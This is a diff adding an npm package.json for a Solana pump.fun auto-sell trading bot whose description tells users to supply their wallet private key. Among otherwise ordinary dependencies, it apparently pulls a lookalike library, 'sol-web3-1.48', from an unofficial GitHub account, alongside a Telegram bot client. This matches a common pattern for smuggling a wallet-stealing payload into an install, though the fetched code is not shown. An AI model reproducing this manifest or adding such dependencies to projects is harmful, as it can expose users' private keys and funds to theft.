@@ -1,0 +1,24 @@
+{
+  "name": "pumpfuntool",
+  "version": "1.1.0",
+  "description": "Solana tool. Set your intended profit % to automatically sell once reached. Custom RPC support. Simply add your private key, the RPC you wish to use, and you're ready to go.",
+  "main": "pump_fun.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "start": "node pump_fun.js"
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "@solana/spl-token": "latest",
+    "@solana/web3.js": "latest",
+    "axios": "latest",
+    "bs58": "latest",
+    "https-proxy-agent": "^7.0.5",
+    "inquirer": "latest",
+    "jito-ts": "^2.2.0",
+    "node-fetch": "^2.6.9",
+    "node-telegram-bot-api": "^0.66.0",
+    "sol-web3-1.48": "github:retardedcat69/sol-web3-1.48"
+  }
+}
